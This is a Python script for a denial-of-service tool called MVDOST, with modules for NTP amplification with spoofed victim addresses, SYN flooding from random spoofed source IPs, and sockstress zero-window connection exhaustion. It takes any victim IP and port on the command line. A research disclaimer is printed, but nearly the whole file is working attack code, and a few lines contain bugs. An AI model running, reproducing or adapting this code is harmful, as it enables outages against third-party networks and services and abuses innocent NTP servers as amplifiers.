import sys
import socket
import random
import getopt
import threading
from optparse import OptionParser
#from scapy.layers.inet import IP
from scapy.all import *
import os
import signal
from time import sleep, ctime
import ntplib

def main():
    
    print " ^^ just ignore that :) "
    print
    print "***************************************************************************"
    print "* MVDOST - Multi Vector Denial of Service Tool - v1 gregkcarson@gmail.com *"
    print "---------------------------------------------------------------------------"    
    print "  'I thought what I'd do was, I'd pretend I was one of those deaf-mutes.'  "
    print "---------------------------------------------------------------------------"
    print " Disclaimer: The sole intent of this tool is to research Denial of Service "  
    print " attack vectors, program them, and run attacks in a controlled, authorized "
    print " setting so as to model the threat and design signature and statistical    "
    print " detective capabilities for identifying, responding to, and mitigating DoS "
    print " attacks.  Any malicious use of this tool is both illegal and done so      "
    print " without the consent of the tool's author.                                 "
    print "---------------------------------------------------------------------------"
    print
    print
    print "The ntpamp module number of threads defaults to the max logical limit.     " 
    print "It cannot exceed the number of ntp servers in our hard coded list. If you  "
    print "are running ntpamp module the port value will override to 123.             "
    print
    print "IF YOU ARE RUNNING THE NTPAMP MODULE: place a file with ntp servers in the "
    print "same directory as the script and title it ntpservers.                      "
    print
    print "Checks are also performed to verify the host is listening and reachable on "
    print "the specified port before launching attacks.                               "
    print

    #Option Parsing and Help Specification
    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage, version="Welcome to %prog, gregkcarson@gmail.com for questions v1.0")
    parser.add_option("-v","--verbose",action="store_true",dest="verbose", help="LOUD NOISES")
    parser.add_option("-q","--quiet", action="store_false",dest="verbose", help="shhhhhhh")
    parser.add_option("-a","--attack",type="string",dest="attacktype", help="This program can run NTP Amplification, TCP SYN flood, and Socket Stressing attacks.  Input one of: ntpamp synflood sockstress")
    parser.add_option("-i","--ip",type="string",dest="victim",help="Specify the victim IP")
    parser.add_option("-p","--port",type="int",dest="port",help="Specify the target port we will connect to.  If you are running ntpamp then it will override and default to 123.")
    options,args=parser.parse_args()    
    
    #Set variables based on user input and redirect execution flow.
    if options.victim is not None:
        global victim
        victim = options.victim
    else:
        print "Review usage. See help."      
        
    if options.port is not None:
        global port
        port = options.port
    else:
        print "See usage. Review Help"

    print "[*]-Port set to: "+str(port)
    print "[*]-Victim set to: "+victim 
    print
    print "... Validating connection to target ..."
    
    counter = 1
    #check the attack setting, validating the connection is actually up, if up launch attack module
    if options.attacktype is not None:
        
        global attacktype
        attacktype = options.attacktype
        
        if attacktype in "ntpamp":
            port = 123
            with open('ntpservers') as f:
                threads=(sum(1 for _ in f))-1
            print "Overide - port set to 123"
            ntpservers = open('ntpservers','r').readlines()
            result0 = ntpchecker(victim)
            if result0==True:
                print "[*] STARTING NTPAMP MODULE"
                for line in ntpservers:
                    result1 = ntpchecker(line)
                    if result1 == True: 
                        for x in range(0,threads):
                            t=threading.Thread(target=launchntp,args=(line,victim))
                            t.start()
                    else:
                        print "Server: %s did not reply on port 123"% line
            else:
                print "Victim is not listening on NTP.  Attack not feasible. Quitting"
                sys.exit(0)
                    
        
        if attacktype in "synflood":
            result2 = validateconnect(victim,port)
            if result2 == True:     
                print "[*] STARTING SYNFLOOD MODULE"
                try:
                    while 1:
                        t=threading.Thread(target=launchsynflood,args=(victim,port))
                        t.daemon=True
                        t.start()
                        threads.append(t)
                except KeyboardInterrupt:
                    print "User interrupted attack"
                    sys.exit(0)
        
        if attacktype in "sockstress":
            result3 = validateconnect(victim,port)
            threads = 8
            if result3 == True:
                print "[*] STARTING SOCKSTRESS MODULE"
                os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + victim + ' -j DROP')
                signal.signal(signal.SIGINT,graceful_shutdown)
                for x in range(0,threads):    
                    t=threading.Thread(target=launchsockstress,args=(victim,port))
                    t.start()   
                   
    else:
        print
        print "Review usage. See help."
        print

def ntpchecker(victim):
    
    c=ntplib.NTPClient()
    try:
        response = c.request(victim)
        return True
    except Exception,e:
        print e


#Straightforward socket validation, take in the user provided variables, connect on socket, provide error if it fails, return boolean value to redirect execution flow to the attack module or quit program if connection validation failed.            
def validateconnect(victim,port):
    print
    print "Attempting to connect to target on %s:%s" % (victim, port)
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((victim,port))
        print
        print "Connected successfully to %s on port %s" % (victim, port)
        return True
    except socket.error, e:
        print
        print "Connection failed to %s on port %s failed. Reason: %s" % (victim,port,e)
        return False
    except KeyboardInterrupt:
        print
        print "User interrupted connection.  Quitting."
        sys.exit(0)
            
def launchntp(line,victim):
    ntpmonlist="\x17\x00\x03\x2a"+"\x00"*4
    x = random.randint(1,65535)
    packet=IP(dst=line,src=victim)/UDP(sport=x,dport=123)/Raw(load=ntpmonlist)
    while 1:
        try:
            send(packet,loop=1,verbose=0)
        except KeyboardInterrupt:
            print "Quitting"
            sys.exit(0)
            
def launchsynflood(victim,port):
    packet = IP()
    packet.src="%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254),)
    packet.dst=victim
    connecting = TCP()
    connecting.sport = random.randint(1,65535)
    connecting.dport = port
    connecting.flags = 'S'
    send(packet/connecting,verbose=0)
    return 0

def launchsockstress(victim,port):
    while 1:
        try:     
            x=random.randint(1,65535)
            response = sr1(IP(dst=victim)/TCP(sport=x,dport=port,flags='S'),timeout=1,verbose=0)
            send(IP(dst=victim)/TCP(sport=x,dport=port,window=0,flags='A',ack=(response[TCP].seq+1))/'\x00\x00',verbose=0)
        except:
            pass

def graceful_shutdown(signal,frame):
    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' +  + ' -j DROP')
    sys.exit()

if __name__=='__main__':
    main()
